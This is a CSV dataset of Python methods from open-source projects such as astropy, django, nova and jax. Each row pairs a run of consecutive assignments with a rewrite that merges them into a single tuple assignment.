repo_name,file_html,class_name,me_name,me_code,old_code,new_code
astropy,https://github.com/astropy/astropy/tree/master/astropy/modeling/polynomial.py,OrthoPolynomialBase,_invlex$365,"def _invlex(self):
        # TODO: This is a very slow way to do this; fix it and related methods
        # like _alpha
        c = []
        xvar = np.arange(self.x_degree + 1)
        yvar = np.arange(self.y_degree + 1)
        for j in yvar:
            for i in xvar:
                c.append((i, j))
        return np.array(c[::-1])","c = []
xvar = np.arange(self.x_degree + 1)
yvar = np.arange(self.y_degree + 1)","c , xvar , yvar  = [], np.arange(self.x_degree + 1), np.arange(self.y_degree + 1)"
machine_learning_python,https://github.com/SmallVagetable/machine_learning_python/tree/master/kmeans/kmeans_base.py,KMeansBase,update_labels_error$98,"def update_labels_error(self, dataset, centers):
        labels = self.assign_points(dataset, centers)
        new_means = defaultdict(list)
        error = 0
        for assignment, point in zip(labels, dataset):
            new_means[assignment].append(point)

        for points in new_means.values():
            newCenter = np.mean(points, axis=0)
            error += np.sqrt(np.sum(np.square(points - newCenter)))

        return labels, error","labels = self.assign_points(dataset, centers)
new_means = defaultdict(list)
error = 0","labels , new_means , error  = self.assign_points(dataset, centers), defaultdict(list), 0"
nova,https://github.com/openstack/nova/tree/master/nova/tests/unit/virt/libvirt/test_driver.py,LibvirtConnTestCase,test_attach_encryptor_unencrypted_volume_meta_provided$9963,"def test_attach_encryptor_unencrypted_volume_meta_provided(self,
            mock_get_encryptor, mock_get_metadata):
        """"""Assert that if an empty encryption metadata dict is provided that
        there is no additional attempt to lookup the metadata or attach the
        encryptor.
        """"""
        drvr = libvirt_driver.LibvirtDriver(fake.FakeVirtAPI(), False)
        encryption = {}
        connection_info = {'data': {'volume_id': uuids.volume_id}}

        drvr._attach_encryptor(self.context, connection_info, encryption)

        mock_get_metadata.assert_not_called()
        mock_get_encryptor.assert_not_called()","drvr = libvirt_driver.LibvirtDriver(fake.FakeVirtAPI(), False)
encryption = {}
connection_info = {'data': {'volume_id': uuids.volume_id}}","drvr , encryption , connection_info  = libvirt_driver.LibvirtDriver(fake.FakeVirtAPI(), False), {}, {'data': {'volume_id': uuids.volume_id}}"
recordlinkage,https://github.com/J535D165/recordlinkage/tree/master/tests/test_indexing.py,TestIndexAlgorithmApi,test_repr$120,"def test_repr(self, index_class):

        index_str = str(index_class)
        index_repr = repr(index_class)
        assert index_str == index_repr

        start_str = '<{}'.format(index_class.__class__.__name__)
        assert index_str.startswith(start_str)","index_str = str(index_class)
index_repr = repr(index_class)","index_str , index_repr  = str(index_class), repr(index_class)"
django,https://github.com/django/django/tree/master/django/db/backends/base/creation.py,BaseDatabaseCreation,destroy_test_db$259,"def destroy_test_db(self, old_database_name=None, verbosity=1, keepdb=False, suffix=None):
        """"""
        Destroy a test database, prompting the user for confirmation if the
        database already exists.
        """"""
        self.connection.close()
        if suffix is None:
            test_database_name = self.connection.settings_dict['NAME']
        else:
            test_database_name = self.get_test_db_clone_settings(suffix)['NAME']

        if verbosity >= 1:
            action = 'Destroying'
            if keepdb:
                action = 'Preserving'
            self.log('%s test database for alias %s...' % (
                action,
                self._get_database_display_str(verbosity, test_database_name),
            ))

        # if we want to preserve the database
        # skip the actual destroying piece.
        if not keepdb:
            self._destroy_test_db(test_database_name, verbosity)

        # Restore the original database name
        if old_database_name is not None:
            settings.DATABASES[self.connection.alias][""NAME""] = old_database_name
            self.connection.settings_dict[""NAME""] = old_database_name","settings.DATABASES[self.connection.alias]['NAME'] = old_database_name
self.connection.settings_dict['NAME'] = old_database_name","settings.DATABASES[self.connection.alias]['NAME'] , self.connection.settings_dict['NAME']  = old_database_name, old_database_name"
MaskFormer,https://github.com/facebookresearch/MaskFormer/tree/master/mask_former/modeling/heads/mask_former_head.py,MaskFormerHead,__init__$48,"def __init__(
        self,
        input_shape: Dict[str, ShapeSpec],
        *,
        num_classes: int,
        pixel_decoder: nn.Module,
        loss_weight: float = 1.0,
        ignore_value: int = -1,
        # extra parameters
        transformer_predictor: nn.Module,
        transformer_in_feature: str,
    ):
        """"""
        NOTE: this interface is experimental.
        Args:
            input_shape: shapes (channels and stride) of the input features
            num_classes: number of classes to predict
            pixel_decoder: the pixel decoder module
            loss_weight: loss weight
            ignore_value: category id to be ignored during training.
            transformer_predictor: the transformer decoder that makes prediction
            transformer_in_feature: input feature name to the transformer_predictor
        """"""
        super().__init__()
        input_shape = sorted(input_shape.items(), key=lambda x: x[1].stride)
        self.in_features = [k for k, v in input_shape]
        feature_strides = [v.stride for k, v in input_shape]
        feature_channels = [v.channels for k, v in input_shape]

        self.ignore_value = ignore_value
        self.common_stride = 4
        self.loss_weight = loss_weight

        self.pixel_decoder = pixel_decoder
        self.predictor = transformer_predictor
        self.transformer_in_feature = transformer_in_feature

        self.num_classes = num_classes","self.in_features = [k for (k, v) in input_shape]
feature_strides = [v.stride for (k, v) in input_shape]
feature_channels = [v.channels for (k, v) in input_shape]
self.ignore_value = ignore_value
self.common_stride = 4
self.loss_weight = loss_weight
self.pixel_decoder = pixel_decoder
self.predictor = transformer_predictor
self.transformer_in_feature = transformer_in_feature
self.num_classes = num_classes","self.in_features , feature_strides , feature_channels , self.ignore_value , self.common_stride , self.loss_weight , self.pixel_decoder , self.predictor , self.transformer_in_feature , self.num_classes  = [k for (k, v) in input_shape], [v.stride for (k, v) in input_shape], [v.channels for (k, v) in input_shape], ignore_value, 4, loss_weight, pixel_decoder, transformer_predictor, transformer_in_feature, num_classes"
R-Drop,https://github.com/dropreg/R-Drop/tree/master/huggingface_transformer_src/src/transformers/tokenization_utils_fast.py,PreTrainedTokenizerFast,_batch_encode_plus$351,"def _batch_encode_plus(
        self,
        batch_text_or_text_pairs: Union[
            List[TextInput], List[TextInputPair], List[PreTokenizedInput], List[PreTokenizedInputPair]
        ],
        add_special_tokens: bool = True,
        padding_strategy: PaddingStrategy = PaddingStrategy.DO_NOT_PAD,
        truncation_strategy: TruncationStrategy = TruncationStrategy.DO_NOT_TRUNCATE,
        max_length: Optional[int] = None,
        stride: int = 0,
        is_split_into_words: bool = False,
        pad_to_multiple_of: Optional[int] = None,
        return_tensors: Optional[str] = None,
        return_token_type_ids: Optional[bool] = None,
        return_attention_mask: Optional[bool] = None,
        return_overflowing_tokens: bool = False,
        return_special_tokens_mask: bool = False,
        return_offsets_mapping: bool = False,
        return_length: bool = False,
        verbose: bool = True,
    ) -> BatchEncoding:

        if not isinstance(batch_text_or_text_pairs, list):
            raise TypeError(f""batch_text_or_text_pairs has to be a list (got {type(batch_text_or_text_pairs)})"")

        # Set the truncation and padding strategy and restore the initial configuration
        self.set_truncation_and_padding(
            padding_strategy=padding_strategy,
            truncation_strategy=truncation_strategy,
            max_length=max_length,
            stride=stride,
            pad_to_multiple_of=pad_to_multiple_of,
        )

        encodings = self._tokenizer.encode_batch(
            batch_text_or_text_pairs,
            add_special_tokens=add_special_tokens,
            is_pretokenized=is_split_into_words,
        )

        # Convert encoding to dict
        # `Tokens` has type: Tuple[
        #                       List[Dict[str, List[List[int]]]] or List[Dict[str, 2D-Tensor]],
        #                       List[EncodingFast]
        #                    ]
        # with nested dimensions corresponding to batch, overflows, sequence length
        tokens_and_encodings = [
            self._convert_encoding(
                encoding=encoding,
                return_token_type_ids=return_token_type_ids,
                return_attention_mask=return_attention_mask,
                return_overflowing_tokens=return_overflowing_tokens,
                return_special_tokens_mask=return_special_tokens_mask,
                return_offsets_mapping=return_offsets_mapping,
                return_length=return_length,
                verbose=verbose,
            )
            for encoding in encodings
        ]

        # Convert the output to have dict[list] from list[dict] and remove the additional overflows dimension
        # From (variable) shape (batch, overflows, sequence length) to ~ (batch * overflows, sequence length)
        # (we say ~ because the number of overflow varies with the example in the batch)
        #
        # To match each overflowing sample with the original sample in the batch
        # we add an overflow_to_sample_mapping array (see below)
        sanitized_tokens = {}
        for key in tokens_and_encodings[0][0].keys():
            stack = [e for item, _ in tokens_and_encodings for e in item[key]]
            sanitized_tokens[key] = stack
        sanitized_encodings = [e for _, item in tokens_and_encodings for e in item]

        # If returning overflowing tokens, we need to return a mapping
        # from the batch idx to the original sample
        if return_overflowing_tokens:
            overflow_to_sample_mapping = []
            for i, (toks, _) in enumerate(tokens_and_encodings):
                overflow_to_sample_mapping += [i] * len(toks[""input_ids""])
            sanitized_tokens[""overflow_to_sample_mapping""] = overflow_to_sample_mapping

        for input_ids in sanitized_tokens[""input_ids""]:
            self._eventual_warn_about_too_long_sequence(input_ids, max_length, verbose)
        return BatchEncoding(sanitized_tokens, sanitized_encodings, tensor_type=return_tensors)","tokens_and_encodings = [self._convert_encoding(encoding=encoding, return_token_type_ids=return_token_type_ids, return_attention_mask=return_attention_mask, return_overflowing_tokens=return_overflowing_tokens, return_special_tokens_mask=return_special_tokens_mask, return_offsets_mapping=return_offsets_mapping, return_length=return_length, verbose=verbose) for encoding in encodings]
sanitized_tokens = {}","tokens_and_encodings , sanitized_tokens  = [self._convert_encoding(encoding=encoding, return_token_type_ids=return_token_type_ids, return_attention_mask=return_attention_mask, return_overflowing_tokens=return_overflowing_tokens, return_special_tokens_mask=return_special_tokens_mask, return_offsets_mapping=return_offsets_mapping, return_length=return_length, verbose=verbose) for encoding in encodings], {}"
lingvo,https://github.com/tensorflow/lingvo/tree/master/lingvo/tasks/mt/decoder.py,MTDecoderV1,_InitBeamSearchStateCallback$975,"def _InitBeamSearchStateCallback(self, theta, encoder_outputs,
                                   num_hyps_per_beam):
    """"""Returns initial beams search states.

    Args:
      theta: a NestedMap of parameters.
      encoder_outputs: a NestedMap computed by encoder.
      num_hyps_per_beam: An int, number hyps to keep for source sentence.

    Returns:
      A tuple (initial_results, states).
        initial_results: a `.NestedMap` of initial results.
          atten_probs:
            The initial attention probs, of shape [tgt_batch, src_len].
        states: a `.NestedMap` of initial model states.
          rnn_states:
            Initial state of the RNN.
          atten_context:
            Initial attention context vector.
          atten_states:
            Initial attention state.
    """"""
    p = self.params
    num_beams = py_utils.GetShape(encoder_outputs.padding)[1]
    num_hyps = num_beams * num_hyps_per_beam
    rnn_states, init_atten_context, atten_probs, atten_states = (
        self._InitDecoder(theta, encoder_outputs, num_hyps))

    initial_results = py_utils.NestedMap(
        log_probs=tf.zeros([num_hyps, p.softmax.num_classes],
                           dtype=py_utils.FPropDtype(p)),
        atten_probs=atten_probs)

    if p.init_step_ids and hasattr(encoder_outputs, 'init_step_ids'):
      initial_results['step_ids'] = tf.expand_dims(
          self._ExpandToNumHyps(encoder_outputs.init_step_ids,
                                num_hyps_per_beam), 1)
    states = py_utils.NestedMap({
        'time_step': tf.constant(0),
        'rnn_states': rnn_states,
        'atten_context': init_atten_context,
        'atten_probs': atten_probs,
        'atten_states': atten_states,
    })
    if p.force_alignment:
      states['num_sentences'] = tf.ones([num_hyps], dtype=tf.int32)
    return initial_results, states","p = self.params
num_beams = py_utils.GetShape(encoder_outputs.padding)[1]","p , num_beams  = self.params, py_utils.GetShape(encoder_outputs.padding)[1]"
boto3,https://github.com/boto/boto3/tree/master/tests/unit/docs/test_service.py,TestServiceDocumenter,test_document_service$22,"def test_document_service(self):
        service_documenter = ServiceDocumenter('myservice', self.session)
        contents = service_documenter.document_service().decode('utf-8')
        lines = [
            '*********',
            'MyService',
            '*********',
            '.. contents:: Table of Contents',
            '   :depth: 2',
            '======',
            'Client',
            '======',
            '.. py:class:: MyService.Client',
            '  These are the available methods:',
            '  *   :py:meth:`~MyService.Client.sample_operation`',
            '    **Examples** ',
            '    Sample Description.',
            '    ::',
            '      response = client.sample_operation(',
            '==========',
            'Paginators',
            '==========',
            'The available paginators are:',
            '* :py:class:`MyService.Paginator.SampleOperation`',
            '.. py:class:: MyService.Paginator.SampleOperation',
            '  .. py:method:: paginate(**kwargs)',
            '=======',
            'Waiters',
            '=======',
            'The available waiters are:',
            '* :py:class:`MyService.Waiter.SampleOperationComplete`',
            '.. py:class:: MyService.Waiter.SampleOperationComplete',
            '  .. py:method:: wait(**kwargs)',
            '================',
            'Service Resource',
            '================',
            '.. py:class:: MyService.ServiceResource()',
            ""  These are the resource's available actions:"",
            '  *   :py:meth:`sample_operation()`',
            ""  These are the resource's available sub-resources:"",
            '  *   :py:meth:`Sample()`',
            ""  These are the resource's available collections:"",
            '  *   :py:attr:`samples`',
            '  .. py:method:: sample_operation(**kwargs)',
            '  .. py:method:: Sample(name)',
            '  .. py:attribute:: samples',
            '    .. py:method:: all()',
            '    .. py:method:: filter(**kwargs)',
            '    .. py:method:: limit(**kwargs)',
            '    .. py:method:: page_size(**kwargs)',
            '======',
            'Sample',
            '======',
            '.. py:class:: MyService.Sample(name)',
            ""  These are the resource's available identifiers:"",
            '  *   :py:attr:`name`',
            ""  These are the resource's available attributes:"",
            '  *   :py:attr:`bar`',
            '  *   :py:attr:`foo`',
            ""  These are the resource's available actions:"",
            '  *   :py:meth:`load()`',
            '  *   :py:meth:`operate()`',
            '  *   :py:meth:`reload()`',
            ""  These are the resource's available waiters:"",
            '  *   :py:meth:`wait_until_complete()`',
            '  .. py:attribute:: name',
            '  .. py:attribute:: bar',
            '  .. py:attribute:: foo',
            '  .. py:method:: load()',
            '  .. py:method:: operate(**kwargs)',
            '  .. py:method:: reload()',
            '  .. py:method:: wait_until_complete(**kwargs)',
        ]
        self.assert_contains_lines_in_order(lines, contents)","contents = service_documenter.document_service().decode('utf-8')
lines = ['*********', 'MyService', '*********', '.. contents:: Table of Contents', '   :depth: 2', '======', 'Client', '======', '.. py:class:: MyService.Client', '  These are the available methods:', '  *   :py:meth:`~MyService.Client.sample_operation`', '    **Examples** ', '    Sample Description.', '    ::', '      response = client.sample_operation(', '==========', 'Paginators', '==========', 'The available paginators are:', '* :py:class:`MyService.Paginator.SampleOperation`', '.. py:class:: MyService.Paginator.SampleOperation', '  .. py:method:: paginate(**kwargs)', '=======', 'Waiters', '=======', 'The available waiters are:', '* :py:class:`MyService.Waiter.SampleOperationComplete`', '.. py:class:: MyService.Waiter.SampleOperationComplete', '  .. py:method:: wait(**kwargs)', '================', 'Service Resource', '================', '.. py:class:: MyService.ServiceResource()', ""  These are the resource's available actions:"", '  *   :py:meth:`sample_operation()`', ""  These are the resource's available sub-resources:"", '  *   :py:meth:`Sample()`', ""  These are the resource's available collections:"", '  *   :py:attr:`samples`', '  .. py:method:: sample_operation(**kwargs)', '  .. py:method:: Sample(name)', '  .. py:attribute:: samples', '    .. py:method:: all()', '    .. py:method:: filter(**kwargs)', '    .. py:method:: limit(**kwargs)', '    .. py:method:: page_size(**kwargs)', '======', 'Sample', '======', '.. py:class:: MyService.Sample(name)', ""  These are the resource's available identifiers:"", '  *   :py:attr:`name`', ""  These are the resource's available attributes:"", '  *   :py:attr:`bar`', '  *   :py:attr:`foo`', ""  These are the resource's available actions:"", '  *   :py:meth:`load()`', '  *   :py:meth:`operate()`', '  *   :py:meth:`reload()`', ""  These are the resource's available waiters:"", '  *   :py:meth:`wait_until_complete()`', '  .. py:attribute:: name', '  .. py:attribute:: bar', '  .. py:attribute:: foo', '  .. py:method:: load()', '  .. py:method:: operate(**kwargs)', '  .. py:method:: reload()', '  .. py:method:: wait_until_complete(**kwargs)']","contents , lines  = service_documenter.document_service().decode('utf-8'), ['*********', 'MyService', '*********', '.. contents:: Table of Contents', '   :depth: 2', '======', 'Client', '======', '.. py:class:: MyService.Client', '  These are the available methods:', '  *   :py:meth:`~MyService.Client.sample_operation`', '    **Examples** ', '    Sample Description.', '    ::', '      response = client.sample_operation(', '==========', 'Paginators', '==========', 'The available paginators are:', '* :py:class:`MyService.Paginator.SampleOperation`', '.. py:class:: MyService.Paginator.SampleOperation', '  .. py:method:: paginate(**kwargs)', '=======', 'Waiters', '=======', 'The available waiters are:', '* :py:class:`MyService.Waiter.SampleOperationComplete`', '.. py:class:: MyService.Waiter.SampleOperationComplete', '  .. py:method:: wait(**kwargs)', '================', 'Service Resource', '================', '.. py:class:: MyService.ServiceResource()', ""  These are the resource's available actions:"", '  *   :py:meth:`sample_operation()`', ""  These are the resource's available sub-resources:"", '  *   :py:meth:`Sample()`', ""  These are the resource's available collections:"", '  *   :py:attr:`samples`', '  .. py:method:: sample_operation(**kwargs)', '  .. py:method:: Sample(name)', '  .. py:attribute:: samples', '    .. py:method:: all()', '    .. py:method:: filter(**kwargs)', '    .. py:method:: limit(**kwargs)', '    .. py:method:: page_size(**kwargs)', '======', 'Sample', '======', '.. py:class:: MyService.Sample(name)', ""  These are the resource's available identifiers:"", '  *   :py:attr:`name`', ""  These are the resource's available attributes:"", '  *   :py:attr:`bar`', '  *   :py:attr:`foo`', ""  These are the resource's available actions:"", '  *   :py:meth:`load()`', '  *   :py:meth:`operate()`', '  *   :py:meth:`reload()`', ""  These are the resource's available waiters:"", '  *   :py:meth:`wait_until_complete()`', '  .. py:attribute:: name', '  .. py:attribute:: bar', '  .. py:attribute:: foo', '  .. py:method:: load()', '  .. py:method:: operate(**kwargs)', '  .. py:method:: reload()', '  .. py:method:: wait_until_complete(**kwargs)']"
vectorbt,https://github.com/polakowo/vectorbt/tree/master/vectorbt/portfolio/base.py,Portfolio,cash$4241,"def cash(self, group_by: tp.GroupByLike = None, in_sim_order: bool = False, free: bool = False,
             wrap_kwargs: tp.KwargsLike = None) -> tp.SeriesFrame:
        """"""Get cash balance series per column/group.

        See the explanation on `in_sim_order` in `Portfolio.value`.
        For `free`, see `Portfolio.cash_flow`.""""""
        if in_sim_order and not self.cash_sharing:
            raise ValueError(""Cash sharing must be enabled for in_sim_order=True"")

        cash_flow = to_2d_array(self.cash_flow(group_by=group_by, free=free))
        if self.wrapper.grouper.is_grouped(group_by=group_by):
            group_lens = self.wrapper.grouper.get_group_lens(group_by=group_by)
            init_cash = to_1d_array(self.get_init_cash(group_by=group_by))
            cash = nb.cash_grouped_nb(
                self.wrapper.shape_2d,
                cash_flow,
                group_lens,
                init_cash
            )
        else:
            if self.wrapper.grouper.is_grouping_disabled(group_by=group_by) and in_sim_order:
                if self.call_seq is None:
                    raise ValueError(""No call sequence attached. ""
                                     ""Pass `attach_call_seq=True` to the class method ""
                                     ""(flexible simulations are not supported)"")
                group_lens = self.wrapper.grouper.get_group_lens()
                init_cash = to_1d_array(self.init_cash)
                call_seq = to_2d_array(self.call_seq)
                cash = nb.cash_in_sim_order_nb(cash_flow, group_lens, init_cash, call_seq)
            else:
                init_cash = to_1d_array(self.get_init_cash(group_by=False))
                cash = nb.cash_nb(cash_flow, init_cash)
        return self.wrapper.wrap(cash, group_by=group_by, **merge_dicts({}, wrap_kwargs))","group_lens = self.wrapper.grouper.get_group_lens(group_by=group_by)
init_cash = to_1d_array(self.get_init_cash(group_by=group_by))","group_lens , init_cash  = self.wrapper.grouper.get_group_lens(group_by=group_by), to_1d_array(self.get_init_cash(group_by=group_by))"
vectorbt,https://github.com/polakowo/vectorbt/tree/master/vectorbt/portfolio/base.py,Portfolio,cash$4241,"def cash(self, group_by: tp.GroupByLike = None, in_sim_order: bool = False, free: bool = False,
             wrap_kwargs: tp.KwargsLike = None) -> tp.SeriesFrame:
        """"""Get cash balance series per column/group.

        See the explanation on `in_sim_order` in `Portfolio.value`.
        For `free`, see `Portfolio.cash_flow`.""""""
        if in_sim_order and not self.cash_sharing:
            raise ValueError(""Cash sharing must be enabled for in_sim_order=True"")

        cash_flow = to_2d_array(self.cash_flow(group_by=group_by, free=free))
        if self.wrapper.grouper.is_grouped(group_by=group_by):
            group_lens = self.wrapper.grouper.get_group_lens(group_by=group_by)
            init_cash = to_1d_array(self.get_init_cash(group_by=group_by))
            cash = nb.cash_grouped_nb(
                self.wrapper.shape_2d,
                cash_flow,
                group_lens,
                init_cash
            )
        else:
            if self.wrapper.grouper.is_grouping_disabled(group_by=group_by) and in_sim_order:
                if self.call_seq is None:
                    raise ValueError(""No call sequence attached. ""
                                     ""Pass `attach_call_seq=True` to the class method ""
                                     ""(flexible simulations are not supported)"")
                group_lens = self.wrapper.grouper.get_group_lens()
                init_cash = to_1d_array(self.init_cash)
                call_seq = to_2d_array(self.call_seq)
                cash = nb.cash_in_sim_order_nb(cash_flow, group_lens, init_cash, call_seq)
            else:
                init_cash = to_1d_array(self.get_init_cash(group_by=False))
                cash = nb.cash_nb(cash_flow, init_cash)
        return self.wrapper.wrap(cash, group_by=group_by, **merge_dicts({}, wrap_kwargs))","group_lens = self.wrapper.grouper.get_group_lens()
init_cash = to_1d_array(self.init_cash)
call_seq = to_2d_array(self.call_seq)","group_lens , init_cash , call_seq  = self.wrapper.grouper.get_group_lens(), to_1d_array(self.init_cash), to_2d_array(self.call_seq)"
salt,https://github.com/saltstack/salt/tree/master/salt/modules/archive.py,,_list_zip$242,"def _list_zip(name, cached):
        """"""
        List the contents of a zip archive.
        Password-protected ZIP archives can still be listed by zipfile, so
        there is no reason to invoke the unzip command.
        """"""
        dirs = set()
        files = []
        links = []
        try:
            with contextlib.closing(zipfile.ZipFile(cached)) as zip_archive:
                for member in zip_archive.infolist():
                    path = member.filename
                    if salt.utils.platform.is_windows():
                        if path.endswith(""/""):
                            # zipfile.ZipInfo objects on windows use forward
                            # slash at end of the directory name.
                            dirs.add(path)
                        else:
                            files.append(path)
                    else:
                        mode = member.external_attr >> 16
                        if stat.S_ISLNK(mode):
                            links.append(path)
                        elif stat.S_ISDIR(mode):
                            dirs.add(path)
                        else:
                            files.append(path)

                _files = copy.deepcopy(files)
                for path in _files:
                    # ZIP files created on Windows do not add entries
                    # to the archive for directories. So, we'll need to
                    # manually add them.
                    dirname = """".join(path.rpartition(""/"")[:2])
                    if dirname:
                        dirs.add(dirname)
                        if dirname in files:
                            files.remove(dirname)
            return list(dirs), files, links
        except zipfile.BadZipfile:
            raise CommandExecutionError(""{} is not a ZIP file"".format(name))","dirs = set()
files = []
links = []","dirs , files , links  = set(), [], []"
K-BERT,https://github.com/autoliuweijie/K-BERT/tree/master/uer/utils/data.py,MlmDataset,worker$841,"def worker(self, proc_id, start, end):
        print(""Worker %d is building dataset ... "" % proc_id)
        set_seed(self.seed)
        pos = start
        f_write = open(""dataset-tmp-"" + str(proc_id) + "".pt"", ""wb"")
        # Open function in python3 does not support tell operation. We have to use codecs.
        with codecs.open(self.corpus_path, ""r"", ""utf-8"") as f:
            instances = []
            for _ in range(self.dup_factor):
                f.seek(start)
                while True:
                    try:
                        line = f.readline()
                    except:
                        continue

                    src = [self.vocab.get(w) for w in self.tokenizer.tokenize(line)]
                    src, tgt = mask_seq(src, len(self.vocab))
                    seg = [1] * len(src)
                    if len(src) >= self.seq_length:
                        src = src[:self.seq_length]
                        tgt = tgt[:self.seq_length]
                        seg = seg[:self.seq_length]
                    else:
                        while len(src) != self.seq_length:
                            src.append(PAD_ID)
                            tgt.append(PAD_ID)
                            seg.append(PAD_ID)

                    instances.append((src, tgt, seg))

                    pos = f.tell()
                    if pos >= end:
                        break

        pickle.dump(instances, f_write)
        f_write.close()","pos = start
f_write = open('dataset-tmp-' + str(proc_id) + '.pt', 'wb')","pos , f_write  = start, open('dataset-tmp-' + str(proc_id) + '.pt', 'wb')"
K-BERT,https://github.com/autoliuweijie/K-BERT/tree/master/uer/utils/data.py,MlmDataset,worker$841,"def worker(self, proc_id, start, end):
        print(""Worker %d is building dataset ... "" % proc_id)
        set_seed(self.seed)
        pos = start
        f_write = open(""dataset-tmp-"" + str(proc_id) + "".pt"", ""wb"")
        # Open function in python3 does not support tell operation. We have to use codecs.
        with codecs.open(self.corpus_path, ""r"", ""utf-8"") as f:
            instances = []
            for _ in range(self.dup_factor):
                f.seek(start)
                while True:
                    try:
                        line = f.readline()
                    except:
                        continue

                    src = [self.vocab.get(w) for w in self.tokenizer.tokenize(line)]
                    src, tgt = mask_seq(src, len(self.vocab))
                    seg = [1] * len(src)
                    if len(src) >= self.seq_length:
                        src = src[:self.seq_length]
                        tgt = tgt[:self.seq_length]
                        seg = seg[:self.seq_length]
                    else:
                        while len(src) != self.seq_length:
                            src.append(PAD_ID)
                            tgt.append(PAD_ID)
                            seg.append(PAD_ID)

                    instances.append((src, tgt, seg))

                    pos = f.tell()
                    if pos >= end:
                        break

        pickle.dump(instances, f_write)
        f_write.close()","src = src[:self.seq_length]
tgt = tgt[:self.seq_length]
seg = seg[:self.seq_length]","src , tgt , seg  = src[:self.seq_length], tgt[:self.seq_length], seg[:self.seq_length]"
jax,https://github.com/google/jax/tree/master/tests/batching_test.py,BatchingTest,testRandom$403,"def testRandom(self):
    seeds = vmap(random.PRNGKey)(np.arange(10))
    ans = vmap(partial(random.normal, shape=(3, 2)))(seeds)
    expected = np.stack([random.normal(random.PRNGKey(seed), (3, 2))
                          for seed in np.arange(10)])
    self.assertAllClose(ans, expected, check_dtypes=False)
    assert len(np.unique(ans)) == 10 * 3 * 2","ans = vmap(partial(random.normal, shape=(3, 2)))(seeds)
expected = np.stack([random.normal(random.PRNGKey(seed), (3, 2)) for seed in np.arange(10)])","ans , expected  = vmap(partial(random.normal, shape=(3, 2)))(seeds), np.stack([random.normal(random.PRNGKey(seed), (3, 2)) for seed in np.arange(10)])"
ibis,https://github.com/ibis-project/ibis/tree/master/ibis/backends/pyspark/tests/test_ddl.py,,test_insert_table$109,"def test_insert_table(client, alltypes, temp_table, test_data_db):
    expr = alltypes
    table_name = temp_table
    db = test_data_db

    client.create_table(table_name, expr.limit(0), database=db)

    client.insert(table_name, expr.limit(10), database=db)

    # check using SparkTable.insert
    t = client.table(table_name, database=db)
    t.insert(expr.limit(10))

    sz = t.count()
    assert sz.execute() == 20

    # Overwrite and verify only 10 rows now
    t.insert(expr.limit(10), overwrite=True)
    assert sz.execute() == 10","expr = alltypes
table_name = temp_table
db = test_data_db","expr , table_name , db  = alltypes, temp_table, test_data_db"
scattertext,https://github.com/JasonKessler/scattertext/tree/master/scattertext/representations/CategoryEmbeddings.py,EmbeddingAligner,get_report_df$193,"def get_report_df(self, n_terms=5):
        conterpart_idx = np.hstack([np.arange(len(self.terms)) + len(self.terms),
                                    np.arange(len(self.terms))])
        idx = np.arange(len(self.terms))
        similarity_df = pd.DataFrame({
            'cosine_distance': self.pairwise_sim[[idx], conterpart_idx[idx]][0],
            'rank_' + self.prefix1: np.where(
                self.pairwise_sim_sort[idx] == conterpart_idx[idx][:, None]
            )[1],
            'rank_' + self.prefix2: np.where(
                self.pairwise_sim_sort[conterpart_idx[idx]] == idx[:, None]
            )[1],
            'context_' + self.prefix1: pd.DataFrame(
                self.labeled_terms[self.pairwise_sim_sort[idx, 1:1 + n_terms]]
            ).apply(', '.join, axis=1).values,
            'context_' + self.prefix2: pd.DataFrame(
                self.labeled_terms[self.pairwise_sim_sort[conterpart_idx[idx], 1:1 + n_terms]]
            ).apply(', '.join, axis=1).values,
        },
            index=self.terms
        )
        return pd.merge(
            similarity_df
                .assign(min_rank=lambda x: np.max(x[['rank_' + self.prefix1, 'rank_' + self.prefix1]], axis=1))
                .sort_values(by='min_rank', ascending=False),
            self.category_embedding_resolver.corpus_
                .get_term_freq_df(),
            left_index=True,
            right_index=True
        )","conterpart_idx = np.hstack([np.arange(len(self.terms)) + len(self.terms), np.arange(len(self.terms))])
idx = np.arange(len(self.terms))","conterpart_idx , idx  = np.hstack([np.arange(len(self.terms)) + len(self.terms), np.arange(len(self.terms))]), np.arange(len(self.terms))"
